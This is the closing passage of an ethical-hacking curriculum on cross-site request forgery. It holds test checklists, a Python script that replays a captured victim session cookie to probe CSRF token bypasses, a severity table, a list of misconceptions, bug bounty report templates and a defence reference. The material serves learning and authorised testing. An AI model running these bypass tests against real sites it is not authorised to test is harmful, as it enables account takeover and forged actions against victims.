  □ Webhook endpoints: signature verification instead of CSRF?
  □ Admin endpoints: re-authentication on critical actions?
  □ Multi-step flows: each step individually protected?
```

### Phase 3 — Token Validation Testing

```
□ Remove token → 403?
□ Empty token → 403?
□ Random value → 403?        ← MOST IMPORTANT
□ Cross-user token → 403?    ← SESSION BINDING
□ Reuse after logout → 403?
□ GET equivalent → 403?
□ Content-Type: text/plain → 403?
□ No Origin header → 403?
□ Origin: null → 403?
□ Origin: https://evil.com → 403?
```

### Phase 4 — CORS Analysis

```
□ Send OPTIONS with Origin: https://evil.com → what ACAO in response?
□ Send OPTIONS with Origin: null → accepted?
□ Send request with no Origin header → allowed?
□ Does server reflect the Origin value back in ACAO?
□ Is ACAC: true present? Combined with what ACAO?
□ Can any allowlisted subdomain be taken over?
□ Any allowlisted origin with user-submitted content?
```

### Phase 5 — Bypass Scenario Testing

```
□ Any same-site XSS? → defeats all defenses
□ Any subdomain takeover? → defeats SameSite + potentially Origin
□ Token appear in any URL? → Referer leakage risk
□ CORS misconfiguration? → token readable cross-origin
□ text/plain accepted with JSON body?
□ Method override active? (test _method=DELETE)
□ State-changing GET endpoints?
□ Lax+POST timing window? (explicit SameSite on cookie?)
```

---

## 21. Token Validation Test Suite

```python
# Complete CSRF token bypass test battery
# Run against every state-changing endpoint

import requests

BASE_URL = "https://target.com"
VICTIM_SESSION = "captured_session_cookie"
VALID_TOKEN = "captured_csrf_token"  # from intercepted legitimate request

def test(name, **kwargs):
    resp = requests.post(f"{BASE_URL}/action",
                         cookies={"session": VICTIM_SESSION},
                         **kwargs)
    print(f"{name}: {resp.status_code} {'VULNERABLE' if resp.status_code == 200 else 'ok'}")

# Test 1: No token
test("T1_no_token", data={"param": "value"})

# Test 2: Empty token
test("T2_empty_token", data={"param": "value", "csrf_token": ""})

# Test 3: Random value — MOST IMPORTANT
test("T3_random_value", data={"param": "value", "csrf_token": "aaaaaaaaaaaaaaaa"})

# Test 4: Cross-user token (use attacker's own valid token)
ATTACKER_TOKEN = "own_account_csrf_token"
test("T4_cross_user", data={"param": "value", "csrf_token": ATTACKER_TOKEN})

# Test 5: Method switch
resp = requests.get(f"{BASE_URL}/action?param=value",
                    cookies={"session": VICTIM_SESSION})
print(f"T5_method_GET: {resp.status_code}")

# Test 6: Content-Type switch
test("T6_content_type", headers={"Content-Type": "text/plain"},
     data='{"param":"value"}')

# Test 7: No Origin header (remove if present)
test("T7_no_origin", data={"param": "value", "csrf_token": VALID_TOKEN},
     headers={"Content-Type": "application/json"})
```

---

## 22. Impact Scoping and Severity

```
SEVERITY TABLE:
  Action                                    Severity
  ─────────────────────────────────────────────────────
  Change email → password reset → ATO       Critical
  Change password directly                  Critical
  Add attacker as admin                     Critical
  Financial transaction (transfer/payment)  Critical/High
  Account deletion (irreversible)           High
  Disable two-factor authentication         High
  Change security settings                  High
  Add/remove authorized users              High
  Generate API keys (blind)                Medium/High
  Data deletion                             High
  Social actions (post, follow)             Medium
  Notification preferences                  Low
  UI preference changes                     Low/Info

CSRF IS BLIND — impact assessment:
  Blindness MATTERS when: action requires knowing current state
                           (change password requires current password)
  Blindness DOES NOT MATTER when: side effect is the goal
                                   (email change → ATO chain)

READ-ONLY ENDPOINTS: ZERO CSRF IMPACT
  Attacker cannot read the response
  Triggering a data export the attacker cannot see = no impact
  CSRF = write-only attack
```

---

## 23. Common Misconceptions — Master List

```
ABOUT WHAT PREVENTS CSRF:
  ✗ "HTTPS prevents CSRF" — encrypted forgery is still forgery
  ✗ "POST prevents CSRF" — HTML forms can auto-submit POST
  ✗ "HttpOnly prevents CSRF" — cookie still auto-sent (HttpOnly = XSS defense)
  ✗ "Secure prevents CSRF" — transport control only
  ✗ "SOP prevents CSRF" — SOP prevents READING, not SENDING
  ✗ "JWTs prevent CSRF" — format irrelevant; cookie delivery = vulnerable
  ✗ "application/json prevents CSRF" — partial; same-site XSS bypasses
  ✗ "WAF prevents CSRF" — cannot distinguish intent from legitimate request
  ✗ "Multi-step workflows prevent CSRF" — each step is individually forgeable
  ✗ "Confirmation dialogs prevent CSRF" — attacker bypasses UI via submit()
  ✗ "SPAs don't need CSRF tokens" — if using session cookies, they do
  ✗ "We use JWTs so we removed CSRF protection" — JWT in cookie = vulnerable

ABOUT SAMESITE:
  ✗ "SameSite=Strict is always best" — breaks legitimate external navigation
  ✗ "SameSite protects against subdomain attacks" — WRONG; subdomains = same-site
  ✗ "SameSite=Lax fully prevents CSRF" — GET state changes still vulnerable
  ✗ "SameSite=Lax cookie is set by browser" — server sets it; browser enforces

ABOUT TOKENS:
  ✗ "Token present = endpoint protected" — must verify value, not just presence
  ✗ "Token in cookie = double-submit pattern" — but cookie-in-cookie is auto-sent
  ✗ "CSRF token can be in URL" — URL → Referer → token leaked to third parties
  ✗ "Any token is better than no token" — presence-only = false sense of security
  ✗ "Per-session tokens are weak" — stable tokens only risky combined with leakage

ABOUT CORS:
  ✗ "ACAO: * enables CSRF" — wildcard + credentials blocked by browser
  ✗ "CORS prevents CSRF" — CORS controls response reading, not request sending
  ✗ "Preflight is a security mechanism" — defers to CORS policy
  ✗ "Non-allowlisted origin can't send requests" — only response read is blocked

ABOUT OAUTH:
  ✗ "OAuth is CSRF-safe by default" — callback endpoint needs state parameter
  ✗ "State parameter just needs to be present" — must be validated server-side
  ✗ "session.get() for state validation is fine" — use session.pop() (single-use)
```

---

## 24. Bug Bounty Report Templates

### Standard Missing CSRF Token

```markdown
## Title
CSRF on [POST /endpoint] Allows [Action] as Authenticated User

## Severity: [Critical/High/Medium] — [one-line justification]

## Summary
The [endpoint] performs [action] without a CSRF token. An attacker who
causes an authenticated victim to load a malicious page can [action]
without victim interaction beyond page load.

## Reproduction
1. Log in to [target] as victim
2. Open the following HTML in a new tab:

[PoC HTML]

3. Observe [action] executes on victim's account

## Impact Chain
[Specific action] via CSRF
  ↓ [next consequence]
  ↓ [worst-case outcome]

## Root Cause
POST /[endpoint] accepts requests with no CSRF token.
Session cookie: [SameSite value] — [does/does not] prevent this vector because [reason].

## Remediation
1. Implement synchronizer CSRF token on this endpoint
2. Validate token value (not just presence) against session
3. Set SameSite=Lax explicitly on session cookie
```

### Token Validation Bypass

```markdown
## Title
CSRF Token Validation Bypass: [Specific Failure] on [Endpoint]

## Severity: Critical — CSRF token present but validation is insufficient

## Vulnerability
[Endpoint] checks for csrf_token presence but does not validate the value
against the session-stored expected token. Any non-empty value is accepted.

## Proof
Request with csrf_token=INVALID_VALUE returns 200 OK:
[request/response]

## Attack
[Standard CSRF PoC with any token value]

## Root Cause
Server checks: if (req.body.csrf_token) { proceed() }
Correct check: if (crypto.timingSafeEqual(received, expected)) { proceed() }

## Remediation
1. Retrieve expected token from session server-side
2. Reject explicitly empty/missing tokens
3. Use constant-time comparison against session value
4. Ensure token is session-bound (not global)
```

### Architectural Finding

```markdown
## Title
[Trusted Origin] XSS Enables Full CSRF Bypass on [API]

## Severity: Critical — Complete CSRF defense chain bypass via architectural trust

## Architecture Gap
[origin] is in [API]'s CORS allowlist and shares the same registered domain.
XSS on [origin] enables same-site credentialed requests to [API] that bypass
all CSRF defenses (SameSite, CORS, Content-Type validation).

## Attack Chain
1. Attacker plants XSS in [origin] (via [vector])
2. Victim with active [API] session visits [origin]
3. XSS executes fetch() to [API] with:
   - Session cookie attached (same-site, SameSite=Lax allows)
   - Origin: [origin] (in CORS allowlist → passes)
   - Content-Type: application/json (JS can set freely)
4. [API] action executes

## Why Existing Defenses Fail
- SameSite=Lax: [origin] is same-site → cookie sent
- CORS allowlist: [origin] explicitly trusted → preflight passes
- Content-Type check: JS fetch() can set any Content-Type

## Remediation
Priority 1: Remove [origin] from CORS allowlist (use backend-to-backend)
Priority 2: Add CSRF tokens to API (independent of CORS trust)
Priority 3: Harden [origin] against XSS (CSP, output encoding)
Priority 4: Consider moving [origin] to separate registered domain
```

---

## Quick Reference — What Stops What

```
evil.com POST form CSRF:
  → Stopped by: SameSite=Lax/Strict, CSRF token
  → NOT stopped by: HttpOnly, Secure, HTTPS, POST method

evil.com fetch() JSON CSRF:
  → Stopped by: Correct CORS policy (evil.com not in allowlist)
  → NOT stopped by: SameSite alone (if CORS allows, cookie sent)
  → NOT stopped by: Content-Type alone (CORS policy is the gate)

Same-site subdomain XSS CSRF:
  → Stopped by: CSRF token (if not leakable), re-authentication
  → NOT stopped by: SameSite (same-site → cookie sent)
  → NOT stopped by: CORS (response blocked, but action may execute)

Same-origin XSS CSRF:
  → Stopped by: Re-authentication ONLY
  → NOT stopped by: CSRF token (XSS reads it), SameSite, CORS, Referer

Login CSRF:
  → Stopped by: CSRF token on login form
  → NOT stopped by: "Login is unauthenticated so no session to protect"

GET state-change CSRF under Lax:
  → Stopped by: Not using GET for state changes
  → NOT stopped by: SameSite=Lax (explicitly allows GET navigation)

OAuth callback CSRF:
  → Stopped by: Correct state parameter (random, single-use, null-checked)
  → NOT stopped by: Standard CSRF tokens (different flow)
```

---

*CSRF Mastery Curriculum — Complete*  
*Modules 01–12 | Ethical Hacking & Bug Bounty*